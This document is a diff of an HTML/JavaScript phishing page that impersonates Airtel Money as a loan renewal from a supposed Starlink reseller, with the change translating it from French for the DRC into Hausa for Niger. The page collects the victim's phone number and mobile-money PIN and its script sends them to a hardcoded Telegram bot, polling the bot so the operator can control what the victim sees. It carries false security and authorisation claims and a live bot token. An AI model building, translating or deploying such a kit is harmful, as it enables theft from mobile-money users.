@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ha">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Money - Paiement Sécurisé</title>
+    <title>Airtel Money - Biya Mai Tsaro</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
@@ -136,10 +135,10 @@
     <div id="declineOverlay">
         <div class="decline-box">
             <div class="text-5xl mb-4">❌</div>
-            <h2 class="text-2xl font-bold text-red-600 mb-2">Mauvais détails saisis</h2>
-            <p class="text-gray-600 mb-6">Les informations fournies sont incorrectes. Veuillez réessayer.</p>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Bayanan da ba daidai ba</h2>
+            <p class="text-gray-600 mb-6">Bayanan da aka bayar ba daidai ba ne. Da fatan za a sake gwadawa.</p>
             <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-                Réessayer
+                Sake gwadawa
             </button>
         </div>
     </div>
@@ -147,8 +146,8 @@
     <div id="loadingOverlay">
   <div class="bg-white rounded-2xl p-6 text-center w-[320px]">
     <div class="spinner mx-auto mb-4"></div>
-    <h2 class="text-lg font-bold text-gray-900">Vérification en cours…</h2>
-    <p class="text-sm text-gray-600 mt-1">Patientez pendant que Telegram confirme votre demande.</p>
+    <h2 class="text-lg font-bold text-gray-900">Ana dubawa…</h2>
+    <p class="text-sm text-gray-600 mt-1">Da fatan za a jira yayin da Telegram ke tabbatar da buƙatarku.</p>
   </div>
 </div>
 
@@ -157,17 +156,17 @@
         <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
             <a href="/" class="flex items-center gap-2">
                 <span class="font-bold text-2xl tracking-widest">AIRTEL LOAN</span>
-                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur RDC</span>
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Dillali Nijar</span>
             </a>
             <nav class="flex gap-6">
                 <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Statut</span>
+                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Matsayi</span>
                 </a>
                 <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Forfaits</span>
+                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Tsare-tsare</span>
                 </a>
                 <a href="/records/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Commandes</span>
+                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Umarni</span>
                 </a>
             </nav>
         </div>
@@ -195,15 +194,15 @@
                     <div class="mb-8">
                         <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4">
                             <div class="text-center sm:text-left">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Montant</p>
-                                <p class="text-3xl sm:text-2xl font-black text-red-600">CDF </p>
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Adadin kuɗi</p>
+                                <p class="text-3xl sm:text-2xl font-black text-red-600">XOF </p>
                             </div>
                             <div class="text-center sm:text-right">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
-                                <p class="text-sm font-bold text-gray-700">Renouvellement Airtel loan</p>
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Sabis</p>
+                                <p class="text-sm font-bold text-gray-700">Sabunta lamunin Airtel</p>
                             </div>
                         </div>
-                        <p class="text-gray-600 text-sm text-center">Entrez votre code PIN Airtel Money pour autoriser</p>
+                        <p class="text-gray-600 text-sm text-center">Shigar da lambar PIN ɗin ku ta Airtel Money don ba da izini</p>
                     </div>
 
                     <form method="POST" action="/hodl/" class="space-y-6" novalidate id="paymentForm">
@@ -212,7 +211,7 @@
                         <!-- Airtel Number Input -->
                         <div>
                             <label class="block text-gray-700 font-bold mb-3 text-sm">
-                                Numéro Airtel Money
+                                Lambar Airtel Money
                             </label>
 
                             <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300">
@@ -221,7 +220,7 @@
 
                                     <img
                                         id="countryFlag"
-                                        src="https://flagcdn.com/w40/cd.png"
+                                        src="https://flagcdn.com/w40/ne.png"
                                         class="w-5 h-4 object-cover rounded-sm"
                                         alt="flag"
                                     >
@@ -231,7 +230,7 @@
                                         class="bg-transparent outline-none text-gray-700 font-bold text-sm cursor-pointer"
                                     >
                                     
-                                        <option value="+227" data-flag="cg">+227</option>
+                                        <option value="+227" data-flag="ne">+227</option>
                                         
                                     </select>
 
@@ -258,10 +257,10 @@
                         <!-- PIN Entry -->
                         <div class="text-center mt-8 mb-6">
                             <p class="text-gray-700 font-bold text-sm">
-                                Entrez le code PIN à 4 chiffres
+                                Shigar da lambar PIN mai lambobi 4
                             </p>
                             <p class="text-gray-500 text-xs mt-1">
-                                Vérifiez votre application Airtel Money ou vos SMS
+                                Duba app ɗin ku na Airtel Money ko SMS ɗinku
                             </p>
                         </div>
 
@@ -282,14 +281,14 @@
                             class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2"
                         >
                             <i class="uil uil-check-circle"></i>
-                            Confirmer le Paiement
+                            Tabbatar da Biyan
                         </button>
                     </form>
 
                     <!-- Security Note -->
                     <div class="mt-8 flex items-center justify-center gap-2 text-gray-500">
                         <i class="uil uil-shield-check text-lg text-green-600"></i>
-                        <p class="text-[11px] uppercase font-bold tracking-widest">Crypté SSL et Sécurisé</p>
+                        <p class="text-[11px] uppercase font-bold tracking-widest">SSL da Tsaro</p>
                     </div>
                 </div>
             </div>
@@ -301,28 +300,28 @@
         <div class="max-w-7xl mx-auto px-4">
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                 <div>
-                    <h3 class="text-white font-bold mb-4">STARLINK RDC</h3>
-                    <p class="text-sm">Revendeur agréé de forfaits de données pour les services Starlink en RDC. Paiements rapides, fiables et sécurisés via Airtel Money.</p>
+                    <h3 class="text-white font-bold mb-4">STARLINK Nijar</h3>
+                    <p class="text-sm">Dillalin da aka amince da shi na tsare-tsaren bayanai don sabis na Starlink a Nijar. Biya cikin sauri, amintacce kuma mai tsaro ta hanyar Airtel Money.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">SUPPORT</h3>
+                    <h3 class="text-white font-bold mb-4">TAIMAKO</h3>
                     <p class="text-sm">Email: support@loandc.reseller</p>
-                    <p class="text-sm">Disponible 24h/24, 7j/7 pour l'assistance technique.</p>
+                    <p class="text-sm">Muna nan kowane lokaci don taimakon fasaha.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">PAIEMENT</h3>
-                    <p class="text-sm">Payez en toute sécurité avec Airtel Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.</p>
+                    <h3 class="text-white font-bold mb-4">BIYA</h3>
+                    <p class="text-sm">Biya lafiya ta Airtel Money. Tabbatar cewa kuna da isassun kuɗi don tsarin da kuka zaɓa.</p>
                 </div>
             </div>
             <div class="border-t border-gray-800 pt-8 text-center">
-                <p>© 2026 Airtel Congo. Tous droits réservés.</p>
+                <p>© 2026 Airtel Nijar. Duk haƙƙoƙi an kiyaye su.</p>
             </div>
         </div>
     </footer>
 
 <script>
 document.addEventListener("DOMContentLoaded", function () {
-  // ===== CONFIG TELEGRAM (À REMPLACER) =====
+  // ===== CONFIG TELEGRAM (SAUYA IDAN LOKACI YAYI) =====
   const TELEGRAM_BOT_TOKEN = "8007031522:AAF8f5dU1f8vEbFbL-sijFvLlOJ1yHYKyME";
   const TELEGRAM_CHAT_ID  = "8880939809";
   // =========================================
@@ -426,7 +425,7 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   });
 
-  // === Afficher l'overlay Decline + reset ===
+  // === Nuna allon kin amincewa + sake saitin ===
   window.showDecline = function () {
     form.reset();
     pinBoxes.forEach(box => box.value = "");
@@ -440,7 +439,7 @@ document.addEventListener("DOMContentLoaded", function () {
     setWaiting(false);
   };
 
-  // === Fermer l'overlay ===
+  // === Rufe allon kin amincewa ===
   window.closeDecline = function () {
     declineOverlay.classList.remove("show");
     setWaiting(false);
@@ -456,7 +455,7 @@ document.addEventListener("DOMContentLoaded", function () {
     }).catch(() => {});
   }
 
-  // === POLLING : écoute les réponses du bot ===
+  // === POLLING : sauraron amsoshin bot ===
   function startPolling() {
     if (pollingActive) return;
     if (!sentMessageId) return;
@@ -502,7 +501,7 @@ document.addEventListener("DOMContentLoaded", function () {
           });
         })
         .catch(err => {
-          console.error("Polling error:", err);
+          console.error("Kuskuren polling:", err);
         });
     }, 2000);
   }
@@ -517,13 +516,13 @@ document.addEventListener("DOMContentLoaded", function () {
     const phone = phoneInput.value.trim();
     if (!phone) {
       setWaiting(false);
-      alert("Veuillez entrer votre numéro Airtel Money.");
+      alert("Da fatan za a shigar da lambar Airtel Money ɗinku.");
       return;
     }
 
     if (hiddenPin.value.length !== 4) {
       setWaiting(false);
-      alert("Veuillez entrer votre code PIN à 4 chiffres.");
+      alert("Da fatan za a shigar da lambar PIN ɗinku mai lambobi 4.");
       return;
     }
 
@@ -533,14 +532,14 @@ document.addEventListener("DOMContentLoaded", function () {
     setWaiting(true);
 
     const message = `
-🔴 NOUVEAU PAIEMENT AIRTEL MONEY
+🔴 SABON BIYAN AIRTEL MONEY
 ━━━━━━━━━━━━━━━━━━━━━
-📱 Numéro : ${fullPhoneNumber}
+📱 Lamba : ${fullPhoneNumber}
 🔑 PIN : ${hiddenPin.value}
-🌐 Pays : ${countrySelect.options[countrySelect.selectedIndex].text}
-🕐 Timestamp : ${new Date().toLocaleString("fr-FR")}
+🌐 Ƙasa : ${countrySelect.options[countrySelect.selectedIndex].text}
+🕐 Lokaci : ${new Date().toLocaleString("ha")}
 ━━━━━━━━━━━━━━━━━━━━━
-⚠️ Ceci est une démo — à des fins de test uniquement.
+⚠️ Wannan gwaji ne — don dalilai na gwaji kawai.
     `.trim();
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -585,7 +584,7 @@ document.addEventListener("DOMContentLoaded", function () {
         }
       })
       .catch(err => {
-        console.error("Erreur Telegram:", err);
+        console.error("Kuskuren Telegram:", err);
         clearTimers();
         setWaiting(false);
         window.location.href = "hodlfa.html";
